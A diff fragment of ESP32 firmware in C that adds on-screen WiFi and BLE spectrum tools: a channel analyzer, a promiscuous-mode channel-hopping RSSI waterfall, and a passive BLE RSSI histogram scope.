+    if (!wana_active) return;
+    if (!wana_scanning) return;
+    if (!wifi_scanner_is_done()) return;
+    wana_scanning = false;
+
+    int n = wifi_scanner_get_results(wana_aps, WANA_MAX_APS);
+    wana_ap_count = (n > WANA_MAX_APS) ? WANA_MAX_APS : n;
+
+    wana_group_ssids();
+    show_wana_select_screen();
+}
+
+static void show_wifi_analyzer_screen(void) {
+    if (!ensure_wifi_mode()) return;
+
+    create_function_page_base("Chanalizer");
+
+    wana_active       = true;
+    wana_scanning     = true;
+    wana_needs_redraw = false;
+    wana_ap_count     = 0;
+    wana_lbl_count    = 0;
+    wana_ssid_count   = 0;
+
+    size_t bufsz = (size_t)WANA_WIDE_W * WANA_CHART_H;  // 520×200 wide portrait buffer
+    wana_buf = heap_caps_calloc(bufsz, sizeof(lv_color_t), MALLOC_CAP_SPIRAM);
+    if (!wana_buf) {
+        ESP_LOGE(TAG, "wana: no PSRAM");
+        wana_active = false;
+        show_wifi_menu_screen();
+        return;
+    }
+
+    lv_obj_set_style_bg_color(function_page, lv_color_make(8, 8, 22), 0);
+    wana_show_scanning_panel();
+
+    wifi_scanner_start_scan();
+    wana_ui_timer = lv_timer_create(wana_ui_timer_cb, 300, NULL);
+}
+
+// ────────────────────────────────────────────────────────────────────────────
+// WIFI BAND SCOPE — real-time promiscuous channel-hopper + SDR waterfall
+// ────────────────────────────────────────────────────────────────────────────
+
+static const uint8_t wscope_2g_ch[] = {1,2,3,4,5,6,7,8,9,10,11,12,13};
+static const uint8_t wscope_5g_ch[] = {
+    36,40,44,48,52,56,60,64,
+    100,104,108,112,116,120,124,128,132,136,140,144,
+    149,153,157,161,165
+};
+#define WSCOPE_2G_N 13
+#define WSCOPE_5G_N 25
+// Canvas: SPEC_H rows + 1 separator + WF_H rows = 203 total
+#define WSCOPE_CANVAS_H (WSCOPE_SPEC_H + 1 + WSCOPE_WF_H)
+
+static void IRAM_ATTR wscope_prom_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    (void)type;
+    if (!wscope_active) return;
+    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    int8_t rssi = (int8_t)pkt->rx_ctrl.rssi;
+    int idx = wscope_cur_ch_idx;
+    if ((unsigned)idx >= WSCOPE_CH_MAX) return;
+    portENTER_CRITICAL(&wscope_mux);
+    if (rssi > wscope_ch_peak[idx]) wscope_ch_peak[idx] = rssi;
+    wscope_ch_cnt[idx]++;
+    portEXIT_CRITICAL(&wscope_mux);
+}
+
+static void wscope_task(void *p) {
+    (void)p;
+    const uint8_t *chl = wscope_5g_mode ? wscope_5g_ch : wscope_2g_ch;
+    int n = wscope_5g_mode ? WSCOPE_5G_N : WSCOPE_2G_N;
+
+    esp_wifi_set_promiscuous_filter(&(wifi_promiscuous_filter_t){
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
+    });
+    esp_wifi_set_promiscuous_rx_cb(wscope_prom_cb);
+    esp_wifi_set_promiscuous(true);
+
+    while (wscope_active) {
+        chl = wscope_5g_mode ? wscope_5g_ch : wscope_2g_ch;
+        n   = wscope_5g_mode ? WSCOPE_5G_N  : WSCOPE_2G_N;
+        for (int i = 0; i < n && wscope_active; i++) {
+            portENTER_CRITICAL(&wscope_mux);
+            wscope_cur_ch_idx = i;
+            wscope_ch_peak[i] = -110;
+            wscope_ch_cnt[i]  = 0;
+            portEXIT_CRITICAL(&wscope_mux);
+            esp_wifi_set_channel(chl[i], WIFI_SECOND_CHAN_NONE);
+            vTaskDelay(pdMS_TO_TICKS(60));
+        }
+        wscope_sweep_done = true;
+    }
+
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    wscope_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void wscope_ui_timer_cb(lv_timer_t *t) {
+    (void)t;
+    if (!wscope_active || !wscope_canvas || !wscope_buf) return;
+
+    int n_ch = wscope_5g_mode ? WSCOPE_5G_N : WSCOPE_2G_N;
+
+    int8_t   peak[WSCOPE_CH_MAX];
+    uint16_t cnt[WSCOPE_CH_MAX];
+    portENTER_CRITICAL(&wscope_mux);
+    memcpy(peak, wscope_ch_peak, n_ch * sizeof(int8_t));
+    memcpy(cnt,  wscope_ch_cnt,  n_ch * sizeof(uint16_t));
+    portEXIT_CRITICAL(&wscope_mux);
+
+    float ppch = (float)WSCOPE_W / n_ch;   // pixels per channel
+
+    // ── Redraw spectrum section (top SPEC_H rows) ────────────────────────
+    lv_color_t bg = lv_color_make(4, 4, 12);
+    for (int y = 0; y < WSCOPE_SPEC_H; y++)
+        for (int x = 0; x < WSCOPE_W; x++)
+            wscope_buf[y * WSCOPE_W + x] = bg;
+
+    for (int ci = 0; ci < n_ch; ci++) {
+        int x0 = (int)(ci * ppch);
+        int x1 = (int)((ci + 1) * ppch) - 2;
+        if (x1 >= WSCOPE_W) x1 = WSCOPE_W - 1;
+        int v = (peak[ci] + 110) * 255 / 90;
+        if (v < 0)   v = 0;
+        if (v > 255) v = 255;
+        int bar_h = v * (WSCOPE_SPEC_H - 2) / 255;
+        lv_color_t col = scope_heat_color((uint8_t)v);
+        for (int y = WSCOPE_SPEC_H - bar_h; y < WSCOPE_SPEC_H; y++) {
+            for (int x = x0; x <= x1; x++) {
+                wscope_buf[y * WSCOPE_W + x] = col;
+            }
+        }
+        // Bright peak pixel
+        if (bar_h > 0) {
+            int pt = WSCOPE_SPEC_H - bar_h;
+            lv_color_t wh = lv_color_make(220, 220, 220);
+            for (int x = x0; x <= x1; x++)
+                wscope_buf[pt * WSCOPE_W + x] = wh;
+        }
+    }
+
+    // Separator line
+    lv_color_t sep = lv_color_make(50, 50, 70);
+    for (int x = 0; x < WSCOPE_W; x++)
+        wscope_buf[WSCOPE_SPEC_H * WSCOPE_W + x] = sep;
+
+    // ── Add new waterfall row on each complete sweep ─────────────────────
+    if (wscope_sweep_done) {
+        wscope_sweep_done = false;
+        int wf_start = WSCOPE_SPEC_H + 1;
+        // Shift waterfall DOWN (newest at top)
+        memmove(wscope_buf + WSCOPE_W * (wf_start + 1),
+                wscope_buf + WSCOPE_W * wf_start,
+                WSCOPE_W * (WSCOPE_WF_H - 1) * sizeof(lv_color_t));
+        // New row at top of waterfall
+        for (int x = 0; x < WSCOPE_W; x++) {
+            int ci = (int)(x / ppch);
+            if (ci >= n_ch) ci = n_ch - 1;
+            int v = (peak[ci] + 110) * 255 / 90;
+            if (v < 0)   v = 0;
+            if (v > 255) v = 255;
+            wscope_buf[wf_start * WSCOPE_W + x] = scope_heat_color((uint8_t)v);
+        }
+    }
+
+    lv_obj_invalidate(wscope_canvas);
+
+    if (wscope_status_lbl) {
+        const uint8_t *cl = wscope_5g_mode ? wscope_5g_ch : wscope_2g_ch;
+        int ci = wscope_cur_ch_idx;
+        int nch = wscope_5g_mode ? WSCOPE_5G_N : WSCOPE_2G_N;
+        char s[48];
+        snprintf(s, sizeof(s), "Ch%u | %s | sweep %.1fs",
+                 (ci < nch) ? cl[ci] : 0,
+                 wscope_5g_mode ? "5 GHz" : "2.4 GHz",
+                 nch * 0.06f);
+        lv_label_set_text(wscope_status_lbl, s);
+    }
+}
+
+static void wscope_band_toggle_cb(lv_event_t *e) {
+    lv_obj_t *lbl = (lv_obj_t *)lv_event_get_user_data(e);
+    wscope_5g_mode = !wscope_5g_mode;
+    if (lbl) lv_label_set_text(lbl, wscope_5g_mode ? "Band: 5 GHz" : "Band: 2.4GHz");
+    portENTER_CRITICAL(&wscope_mux);
+    for (int i = 0; i < WSCOPE_CH_MAX; i++) { wscope_ch_peak[i] = -110; wscope_ch_cnt[i] = 0; }
+    portEXIT_CRITICAL(&wscope_mux);
+    if (wscope_ax_lbl)
+        lv_label_set_text(wscope_ax_lbl, wscope_5g_mode
+            ? "36-64 | 100-144 | 149-165"
+            : "1    2    3    4    5    6    7    8    9   10   11   12   13");
+    if (wscope_buf)
+        memset(wscope_buf, 0, WSCOPE_W * WSCOPE_CANVAS_H * sizeof(lv_color_t));
+}
+
+static void wscope_exit_cb(lv_event_t *e) {
+    (void)e;
+    wscope_active = false;  // task self-exits when this clears
+    if (wscope_ui_timer) { lv_timer_del(wscope_ui_timer); wscope_ui_timer = NULL; }
+    if (wscope_buf)      { heap_caps_free(wscope_buf);     wscope_buf = NULL; }
+    wscope_canvas = NULL;
+    wscope_status_lbl = NULL;
+    wscope_ax_lbl = NULL;
+    show_wifi_menu_screen();
+}
+
+static void show_wscope_screen(void) {
+    if (!ensure_wifi_mode()) return;
+    wifi_scanner_abort();   // stop any in-progress scan
+
+    create_function_page_base("WiFi Band Scope");
+    wscope_active     = true;
+    wscope_5g_mode    = false;
+    wscope_sweep_done = false;
+    for (int i = 0; i < WSCOPE_CH_MAX; i++) {
+        wscope_ch_peak[i] = -110;
+        wscope_ch_cnt[i]  = 0;
+    }
+
+    int buf_px = WSCOPE_W * WSCOPE_CANVAS_H;
+    wscope_buf = heap_caps_calloc(buf_px, sizeof(lv_color_t), MALLOC_CAP_SPIRAM);
+    if (!wscope_buf) { ESP_LOGE(TAG, "WiFiScope: PSRAM fail"); return; }
+
+    // Canvas (y=30)
+    wscope_canvas = lv_canvas_create(function_page);
+    lv_canvas_set_buffer(wscope_canvas, wscope_buf, WSCOPE_W, WSCOPE_CANVAS_H, LV_IMG_CF_TRUE_COLOR);
+    lv_obj_set_pos(wscope_canvas, 0, 30);
+    lv_obj_set_size(wscope_canvas, WSCOPE_W, WSCOPE_CANVAS_H);
+
+    int cy = 30 + WSCOPE_CANVAS_H;  // y below canvas = 30+203=233
+
+    // Status label (y=234)
+    wscope_status_lbl = lv_label_create(function_page);
+    lv_obj_set_size(wscope_status_lbl, 236, 14);
+    lv_obj_set_pos(wscope_status_lbl, 2, cy + 1);
+    lv_label_set_text(wscope_status_lbl, "Starting...");
+    lv_obj_set_style_text_font(wscope_status_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(wscope_status_lbl, lv_color_hex(0xAAAAAA), 0);
+
+    // Channel axis label (y=250)
+    wscope_ax_lbl = lv_label_create(function_page);
+    lv_obj_set_size(wscope_ax_lbl, 240, 14);
+    lv_obj_set_pos(wscope_ax_lbl, 0, cy + 17);
+    lv_label_set_text(wscope_ax_lbl, "1    2    3    4    5    6    7    8    9   10   11   12   13");
+    lv_obj_set_style_text_font(wscope_ax_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(wscope_ax_lbl, lv_color_hex(0x666666), 0);
+
+    // Band toggle + Exit (y=266)
+    int brow_y = cy + 33;
+    lv_obj_t *band_btn = lv_btn_create(function_page);
+    lv_obj_set_size(band_btn, 110, 26);
+    lv_obj_set_pos(band_btn, 4, brow_y);
+    lv_obj_set_style_bg_color(band_btn, lv_color_hex(0x1565C0), 0);
+    lv_obj_t *band_lbl = lv_label_create(band_btn);
+    lv_label_set_text(band_lbl, "Band: 2.4GHz");
+    lv_obj_center(band_lbl);
+    lv_obj_set_style_text_font(band_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_add_event_cb(band_btn, wscope_band_toggle_cb, LV_EVENT_CLICKED, band_lbl);
+
+    lv_obj_t *exit_btn = lv_btn_create(function_page);
+    lv_obj_set_size(exit_btn, 108, 26);
+    lv_obj_set_pos(exit_btn, 128, brow_y);
+    lv_obj_set_style_bg_color(exit_btn, lv_color_hex(0x333333), 0);
+    lv_obj_add_event_cb(exit_btn, wscope_exit_cb, LV_EVENT_CLICKED, NULL);
+    lv_obj_t *el = lv_label_create(exit_btn);
+    lv_label_set_text(el, LV_SYMBOL_LEFT " Exit");
+    lv_obj_center(el);
+    lv_obj_set_style_text_font(el, &lv_font_montserrat_12, 0);
+
+    xTaskCreate(wscope_task, "wscope", 3072, NULL, 5, &wscope_task_handle);
+    wscope_ui_timer = lv_timer_create(wscope_ui_timer_cb, 100, NULL);
+}
+
+// ────────────────────────────────────────────────────────────────────────────
+// BLE BAND SCOPE — real-time NimBLE passive scan · RSSI distribution waterfall
+// ────────────────────────────────────────────────────────────────────────────
+
+static int blescope_gap_cb(struct ble_gap_event *event, void *arg) {
+    (void)arg;
+    if (!blescope_active) return 0;
+    if (event->type != BLE_GAP_EVENT_DISC) return 0;
+    int rssi = event->disc.rssi;          // typically -100..-20 dBm
+    // Map rssi to pixel column: -100 dBm = x=0, -30 dBm = x=239
+    int x = (rssi + 100) * WSCOPE_W / 70;
+    if (x < 0)          x = 0;
+    if (x >= WSCOPE_W)  x = WSCOPE_W - 1;
+    portENTER_CRITICAL(&blescope_mux);
+    if (blescope_hist[x] < 0xFFFF) blescope_hist[x]++;
+    blescope_win_pkts++;
+    blescope_pkt_total++;
+    portEXIT_CRITICAL(&blescope_mux);
+    return 0;
+}
+
+static void blescope_ui_timer_cb(lv_timer_t *t) {
+    (void)t;
+    if (!blescope_active || !blescope_canvas || !blescope_buf) return;
+
+    // Snapshot + clear histogram
+    uint16_t hist[WSCOPE_W];
+    uint32_t win_pkts;
+    portENTER_CRITICAL(&blescope_mux);
+    memcpy(hist, blescope_hist, sizeof(hist));
+    memset(blescope_hist, 0, sizeof(blescope_hist));
+    win_pkts = blescope_win_pkts;
+    blescope_win_pkts = 0;
+    portEXIT_CRITICAL(&blescope_mux);
+
+    // Find max for log-scale normalization
+    uint16_t mx = 1;
+    for (int x = 0; x < WSCOPE_W; x++) if (hist[x] > mx) mx = hist[x];
+
+    // ── Spectrum section ─────────────────────────────────────────────────
+    lv_color_t bg = lv_color_make(4, 4, 12);
+    for (int y = 0; y < WSCOPE_SPEC_H; y++)
+        for (int x = 0; x < WSCOPE_W; x++)
+            blescope_buf[y * WSCOPE_W + x] = bg;
+
+    for (int x = 0; x < WSCOPE_W; x++) {
+        if (!hist[x]) continue;
+        // Log scale: v = log2(1+count) / log2(1+max) * 255
+        float v = log2f(1.0f + hist[x]) / log2f(1.0f + mx) * 255.0f;
+        if (v > 255.0f) v = 255.0f;
+        int bar_h = (int)(v * (WSCOPE_SPEC_H - 2) / 255.0f);
+        if (bar_h < 1) bar_h = 1;
+        lv_color_t col = scope_heat_color((uint8_t)v);
+        for (int y = WSCOPE_SPEC_H - bar_h; y < WSCOPE_SPEC_H; y++)
+            blescope_buf[y * WSCOPE_W + x] = col;
+        // Peak pixel
+        blescope_buf[(WSCOPE_SPEC_H - bar_h) * WSCOPE_W + x] = lv_color_make(220,220,220);
+    }
+
+    // Separator
+    lv_color_t sep = lv_color_make(50, 50, 70);
+    for (int x = 0; x < WSCOPE_W; x++)
+        blescope_buf[WSCOPE_SPEC_H * WSCOPE_W + x] = sep;
+
+    // ── Waterfall row ────────────────────────────────────────────────────
+    int wf_start = WSCOPE_SPEC_H + 1;
+    memmove(blescope_buf + WSCOPE_W * (wf_start + 1),
+            blescope_buf + WSCOPE_W * wf_start,
+            WSCOPE_W * (WSCOPE_WF_H - 1) * sizeof(lv_color_t));
+    for (int x = 0; x < WSCOPE_W; x++) {
+        float v = hist[x] ? log2f(1.0f + hist[x]) / log2f(1.0f + mx) * 255.0f : 0.0f;
+        if (v > 255.0f) v = 255.0f;
+        blescope_buf[wf_start * WSCOPE_W + x] = scope_heat_color((uint8_t)v);
+    }
+
+    lv_obj_invalidate(blescope_canvas);
+
+    if (blescope_status_lbl) {
+        char s[48];
+        snprintf(s, sizeof(s), "Total: %lu pkts | Window: %lu pkts",
+                 (unsigned long)blescope_pkt_total, (unsigned long)win_pkts);
+        lv_label_set_text(blescope_status_lbl, s);
+    }
+}
+
+static void blescope_exit_cb(lv_event_t *e) {
+    (void)e;
+    blescope_active = false;
+    ble_gap_disc_cancel();
+    if (blescope_ui_timer) { lv_timer_del(blescope_ui_timer); blescope_ui_timer = NULL; }
+    if (blescope_buf)      { heap_caps_free(blescope_buf);     blescope_buf = NULL; }
+    blescope_canvas = NULL;
+    blescope_status_lbl = NULL;
+    show_bluetooth_screen();
+}
+
+static void show_blescope_screen(void) {
+    if (!ensure_ble_mode()) {
+        ESP_LOGE(TAG, "BLE Scope: cannot init BLE"); return;
+    }
+
+    create_function_page_base("BLE Band Scope");
+    blescope_active    = true;
+    blescope_pkt_total = 0;
+    blescope_win_pkts  = 0;
+    memset(blescope_hist, 0, sizeof(blescope_hist));
+
+    int buf_px = WSCOPE_W * WSCOPE_CANVAS_H;
+    blescope_buf = heap_caps_calloc(buf_px, sizeof(lv_color_t), MALLOC_CAP_SPIRAM);
+    if (!blescope_buf) { ESP_LOGE(TAG, "BLEScope: PSRAM fail"); return; }
+
+    // Canvas (y=30)
+    blescope_canvas = lv_canvas_create(function_page);
+    lv_canvas_set_buffer(blescope_canvas, blescope_buf, WSCOPE_W, WSCOPE_CANVAS_H, LV_IMG_CF_TRUE_COLOR);
+    lv_obj_set_pos(blescope_canvas, 0, 30);
+    lv_obj_set_size(blescope_canvas, WSCOPE_W, WSCOPE_CANVAS_H);
+
+    int cy = 30 + WSCOPE_CANVAS_H;   // y below canvas = 233
+
+    // Status label
+    blescope_status_lbl = lv_label_create(function_page);
+    lv_obj_set_size(blescope_status_lbl, 236, 14);
+    lv_obj_set_pos(blescope_status_lbl, 2, cy + 1);
+    lv_label_set_text(blescope_status_lbl, "Scanning BLE...");
+    lv_obj_set_style_text_font(blescope_status_lbl, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(blescope_status_lbl, lv_color_hex(0xAAAAAA), 0);
+
+    // RSSI axis labels
+    lv_obj_t *ax = lv_label_create(function_page);
+    lv_obj_set_size(ax, 240, 14);
+    lv_obj_set_pos(ax, 0, cy + 17);
+    lv_label_set_text(ax, "-100       -80        -60        -40    dBm");
+    lv_obj_set_style_text_font(ax, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(ax, lv_color_hex(0x666666), 0);
+
+    // Exit button
+    lv_obj_t *exit_btn = lv_btn_create(function_page);
+    lv_obj_set_size(exit_btn, 110, 26);
+    lv_obj_set_pos(exit_btn, 65, cy + 33);
+    lv_obj_set_style_bg_color(exit_btn, lv_color_hex(0x333333), 0);
+    lv_obj_add_event_cb(exit_btn, blescope_exit_cb, LV_EVENT_CLICKED, NULL);
+    lv_obj_t *el = lv_label_create(exit_btn);
+    lv_label_set_text(el, LV_SYMBOL_LEFT " Exit");
+    lv_obj_center(el);
+    lv_obj_set_style_text_font(el, &lv_font_montserrat_12, 0);
+
+    // Start passive BLE scan
+    struct ble_gap_disc_params sp = {
+        .passive = 1,
+        .filter_duplicates = 0,
+        .itvl = BLE_GAP_SCAN_ITVL_MS(100),
+        .window = BLE_GAP_SCAN_WIN_MS(90),
+    };
+    ble_gap_disc_cancel();
+    int blescope_rc = ble_gap_disc(BLE_OWN_ADDR_RANDOM, BLE_HS_FOREVER, &sp, blescope_gap_cb, NULL);
+    if (blescope_rc != 0 && blescope_status_lbl) {
+        char err[40];
+        snprintf(err, sizeof(err), "Scan start err %d - check BLE", blescope_rc);
+        lv_label_set_text(blescope_status_lbl, err);
+    }
+
+    blescope_ui_timer = lv_timer_create(blescope_ui_timer_cb, 300, NULL);
 }
 
 // ============================================================================
